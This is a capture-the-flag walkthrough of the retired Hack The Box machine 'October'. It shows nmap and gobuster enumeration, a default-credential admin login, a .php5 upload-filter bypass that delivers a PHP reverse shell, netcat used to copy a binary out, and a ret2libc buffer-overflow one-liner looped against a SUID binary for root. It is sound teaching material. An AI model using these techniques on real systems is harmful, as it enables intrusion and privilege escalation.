![logo](/logo.png)

# [October- BOX]  
Hi folks, today I am going to solve an Easy rated hack the box machine which was released on 20 Apr 2017 as the 13th machine on HTB,October created by ch4p.So without any further intro, let'sf jump in.

# common enumeration

## Nmap
  *http
  *CMS
  
###### code-nmap

```code
nmap -sV -sC -oA nmap/october 10.10.10.16
```

###### Output 

![](/Linux/Linux-Medium/October/Screenshots/nmap.png)

```sh
nmap -sV -sC -oA nmap/october 10.10.10.16                                                                                         ─╯
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-14 20:35 EAT
Nmap scan report for 10.10.10.16
Host is up (0.39s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 79:b1:35:b6:d1:25:12:a3:0c:b5:2e:36:9c:33:26:28 (DSA)
|   2048 16:08:68:51:d1:7b:07:5a:34:66:0d:4c:d0:25:56:f5 (RSA)
|   256 e3:97:a7:92:23:72:bf:1d:09:88:85:b6:6c:17:4e:85 (ECDSA)
|_  256 89:85:90:98:20:bf:03:5d:35:7f:4a:a9:e1:1b:65:31 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: October CMS - Vanilla
|_http-server-header: Apache/2.4.7 (Ubuntu)
| http-methods: 
|_  Potentially risky methods: PUT PATCH DELETE
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.36 seconds
```

looking at the results  we find out that there are 2 ports open and its a `Ubuntu`and its running an `Apache httpd 2.4.7`. 

port[22]-ssh
port[80]-http

when we naviagate to [http://10.10.10.16](http://10.10.10.16)  we find a page run a theme for CMS

![](/Linux/Linux-Medium/October/Screenshots/vanilla.png)

I decide to run `gobuster` so that i can revel other directory that can be used to exploit the machine.

```sh
gobuster dir -u http://10.10.10.16 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -k
```

![](/Linux/Linux-Medium/October/Screenshots/gobuster.png)

`Gobuster` revels a page module backed and it looks interesting upon viewing an Administrator login page

![](/Linux/Linux-Medium/October/Screenshots/Administrator.png)

Upon trying default password like `admin:admin` i log in to the administrator of the CMs

![](/Linux/Linux-Medium/October/Screenshots/Admin.png)

The media page revel that you can upload a php file beacuse their is a php file uploaded so we would probaly use this to upload a shell.

![](/Linux/Linux-Medium/October/Screenshots/upload.png)

Upon searching I come accross an [exploit](https://www.exploit-db.com/exploits/41936) According to the above exploit, it is possible to upload a file with a `.php5 ` extension and it will bypass the filter. From here it is trivial to obtain a shell on the target. Let upload a reverse shell a default from kali Linux

```sh
locate php-reverse-shell.php
```

Then to copy to working directory

```sh
cp /usr/share/laudanum/php/php-reverse-shell.php .
```

![](/Linux/Linux-Medium/October/Screenshots/phpreverse.png)

![](/Linux/Linux-Medium/October/Screenshots/reverseshell.png)
so we upload this file and set a listner.

```sh
nc -lnvp 1234
```

![](/Linux/Linux-Medium/October/Screenshots/shell.png)

and you can get `user.txt`

![](/Linux/Linux-Medium/October/Screenshots/user.txt.png)

so i run `LinEnum` which is used to determine if their are vunerability on the box [LinEnum](https://github.com/rebootuser/LinEnum)

![](Linux/Linux-Medium/October/Screenshots/LinEnum.png)
Running LinEnum reveals a non-standard SUID binary at `/usr/local/bin/ovrflw`. Passing a large
argument to the binary causes a segmentation fault, and it can be assumed that root is obtained
by exploiting the buffer overflow.

![](/Linux/Linux-Medium/October/Screenshots/overflow.png)

Checksec shows that NX/DEP is enabled. Checking on the target reveals that ASLR is also
enabled. Passing a pattern to the binary in gdb finds that there is 112 bytes before the buffer is
overflowed and the EIP is overwritten.

so lets send the binary to our machine 

```sh
nc -w 5 10.10.14.15 9000 < /usr/local/bin/ovrflw
```

![](/Linux/Linux-Medium/October/Screenshots/nc.png)

![](Linux/Linux-Medium/October/Screenshots/ovflw.png)
Then we check the file to see if it has changed the content we we imported it to our machine.

```sh
md5sum ovrflw
```

![](/Linux/Linux-Medium/October/Screenshots/md5.png)

![](/Linux/Linux-Medium/October/Screenshots/md5sum.png)

The command `ldd /usr/local/bin/overflw | grep libc` will get the libc address of the binary as well as the path to the libc library.

```sh
ldd /usr/local/bin/overflw | grep libc
```

![](/Linux/Linux-Medium/October/Screenshots/libc.png)

The command `readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system` will get the system offset for libc.

```sh
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```

![](/Linux/Linux-Medium/October/Screenshots/system.png)

The command `strings -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh` will find the address to reference to call `/bin/sh`.

```sh
strings -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```

![](/Linux/Linux-Medium/October/Screenshots/strings.png)

Using the above information, it is possible to create a script to repeatedly call the binary with a
payload in the following format: `JUNK*112 + libcAddress + JUNK*8 + binShAddress

![](/Linux/Linux-Medium/October/Screenshots/overflow2.png)

Because ASLR is enabled, I’ll do it in a loop until I get a shell:

```sh
while true; do /usr/local/bin/ovrflw $(python -c 'print "\x90"*112 + "\x10\x83\x63\xb7" + "\x60\xb2\x62\xb7" + "\xac\xab\x75\xb7"'); done
```


You can get the `root.txt` now since we have root privillage

![](/Linux/Linux-Medium/October/Screenshots/root.png)

